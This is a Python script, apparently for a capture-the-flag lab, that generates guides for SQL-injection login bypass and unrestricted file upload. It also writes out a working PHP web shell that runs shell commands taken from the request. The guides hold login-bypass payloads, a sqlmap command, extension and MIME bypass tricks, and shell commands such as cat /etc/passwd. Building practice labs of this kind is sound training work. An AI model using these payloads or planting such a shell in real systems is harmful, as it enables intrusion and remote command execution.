"""
Web Exploitation Challenge Creator
Tests SQL injection and web vulnerability skills
"""

from pathlib import Path


class WebExploitChallenge:
    """Creates web exploitation challenge files"""
    
    def __init__(self, output_dir, flags):
        self.output_dir = Path(output_dir)
        self.flags = flags
    
    def create(self):
        """Create web exploitation challenge components"""
        self._create_vulnerable_login()
        self._create_vulnerable_upload()
        self._create_web_shell()
        print("[+] Created web exploitation challenge")
    
    def _create_vulnerable_login(self):
        """Create vulnerable login page (simulated PHP)"""
        # Since we're using Python server, create documentation
        login_doc = f"""# Vulnerable Login Page

## Vulnerability: SQL Injection

The login page is vulnerable to SQL injection attacks.

## Exploitation

### Method 1: Classic SQL Injection
```
Username: admin' OR '1'='1
Password: anything
```

### Method 2: Comment-based Injection
```
Username: admin' --
Password: (anything)
```

### Method 3: Union-based Injection
```
Username: admin' UNION SELECT NULL--
Password: (anything)
```

## Flag 2 Location

Upon successful SQL injection, Flag 2 will be displayed:
`{self.flags['flag2_exploit']}`

## SQL Query (Vulnerable)

```sql
SELECT * FROM users 
WHERE username='$username' AND password='$password'
```

When injecting `admin' OR '1'='1`, the query becomes:
```sql
SELECT * FROM users 
WHERE username='admin' OR '1'='1' AND password='...'
```

This always returns true, bypassing authentication.

## Tools to Use

1. Manual injection in browser
2. sqlmap:
   ```bash
   sqlmap -u "http://localhost:8080/login" \\
          --data="username=test&password=test" \\
          --method=POST
   ```

3. Burp Suite for intercepting and modifying requests
"""
        
        with open(self.output_dir / 'www' / 'LOGIN_VULN.md', 'w') as f:
            f.write(login_doc)
    
    def _create_vulnerable_upload(self):
        """Create vulnerable file upload documentation"""
        upload_doc = """# Vulnerable File Upload

## Vulnerability: Unrestricted File Upload

The file upload functionality doesn't properly validate file types.

## Exploitation Techniques

### 1. PHP Web Shell Upload

Create a simple PHP web shell:

```php
<?php
// Simple web shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Save as `shell.php`

### 2. Extension Bypass Techniques

If basic `.php` is blocked, try:
- Double extension: `shell.php.jpg`
- Null byte: `shell.php%00.jpg`
- Case variation: `shell.PHP` or `shell.PhP`
- Alternative extensions: `shell.php3`, `shell.php4`, `shell.php5`, `shell.phtml`

### 3. MIME Type Manipulation

Use Burp Suite to change:
```
Content-Type: image/jpeg
```

While uploading PHP file.

### 4. Upload Location

Files are uploaded to: `/uploads/`

Access your uploaded shell at:
```
http://localhost:8080/uploads/shell.php?cmd=whoami
```

## Web Shell Commands

Once uploaded, test with:
```
?cmd=whoami
?cmd=id
?cmd=ls -la
?cmd=cat /etc/passwd
```

## Next Steps

After upload successful:
1. Test web shell functionality
2. Upgrade to reverse shell
3. Find Flag 3 in user home directory
"""
        
        with open(self.output_dir / 'www' / 'UPLOAD_VULN.md', 'w') as f:
            f.write(upload_doc)
    
    def _create_web_shell(self):
        """Create example web shell"""
        web_shell = f"""<?php
// Simple PHP Web Shell - For CTF Practice Only
// DO NOT USE IN REAL ENVIRONMENTS

if(isset($_GET['cmd'])) {{
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}}

// Flag hint: Check user home directories
// Flag 3 is located in /home/admin/.bash_history
?>

<!DOCTYPE html>
<html>
<head>
    <title>Web Shell</title>
    <style>
        body {{ font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }}
        input {{ background: #2e2e2e; color: #00ff00; border: 1px solid #00ff00; padding: 5px; width: 80%; }}
        button {{ background: #00ff00; color: #000; border: none; padding: 5px 15px; cursor: pointer; }}
    </style>
</head>
<body>
    <h2>ðŸš€ Web Shell</h2>
    <form method="GET">
        <input type="text" name="cmd" placeholder="Enter command..." value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : 'whoami'; ?>">
        <button type="submit">Execute</button>
    </form>
    <br>
    <?php
    if(isset($_GET['cmd'])) {{
        echo "<h3>Command: " . htmlspecialchars($_GET['cmd']) . "</h3>";
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
    }}
    
    // Hidden flag for shell access
    // {self.flags['flag3_shell']}
    ?>
</body>
</html>"""
        
        with open(self.output_dir / 'www' / 'shell_example.php', 'w') as f:
            f.write(web_shell)